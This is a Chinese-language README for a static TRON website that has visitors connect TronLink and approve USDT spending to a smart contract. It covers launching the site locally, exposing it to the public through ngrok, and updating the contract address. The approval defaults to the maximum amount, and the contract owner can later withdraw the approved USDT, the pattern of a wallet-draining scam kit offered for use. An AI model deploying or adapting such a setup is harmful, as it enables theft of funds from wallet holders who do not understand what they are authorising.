# TRON授权网站使用指南

本静态网站用于用户授权USDT给智能合约，适用于TRON主网环境。

## 文件说明

- `index.html`: 主页面，包含授权功能
- `assets/`: 资源文件夹
  - `app.js`: 核心JavaScript逻辑
  - `style.css`: 样式表
  - 其他资源文件

## 使用方法

### 启动网站

1. 双击运行`启动TronLink网站.bat`
2. 网站将在本地服务器启动（默认端口8080）
3. 浏览器会自动打开网站

### 公网访问（可选）

如需让其他人访问您的授权网站，可以使用ngrok等工具进行内网穿透：

```
ngrok http 8080
```

## 授权流程

1. 用户打开网站并连接TronLink钱包
2. 输入要授权的USDT金额（默认为最大值）
3. 点击"授权转账"按钮
4. 在TronLink钱包中确认交易
5. 等待授权交易确认
6. 网站显示授权成功消息

## 配置说明

网站核心配置在`assets/app.js`文件中：

```javascript
const CONTRACT_ADDRESS = '智能合约地址';
const USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 主网USDT地址
```

部署新合约后，需要更新`CONTRACT_ADDRESS`变量值。可以通过上级目录中的`update_website.bat`自动更新。

## 注意事项

- 用户必须安装并登录TronLink钱包
- 主网操作消耗真实TRX作为Gas费
- 授权金额不会立即从用户钱包转出，只有在合约拥有者执行提款操作时才会转移USDT
- 默认授权金额设为最大值，用户可以根据需要修改

## 自定义修改

如需修改网站样式或逻辑：

- 编辑`index.html`修改页面结构
- 编辑`assets/style.css`修改样式
- 编辑`assets/app.js`修改交互逻辑

## 常见问题

1. **无法连接钱包？**
   - 确认已安装TronLink钱包
   - 确认已登录TronLink账户
   - 刷新页面并重试

2. **授权失败？**
   - 确认用户钱包中有足够的TRX支付Gas费
   - 确认用户钱包中有足够的USDT余额
   - 检查网络连接是否正常

3. **更新合约地址？**
   - 编辑`assets/app.js`文件，更新`CONTRACT_ADDRESS`值
   - 或运行上级目录中的`update_website.bat`自动更新 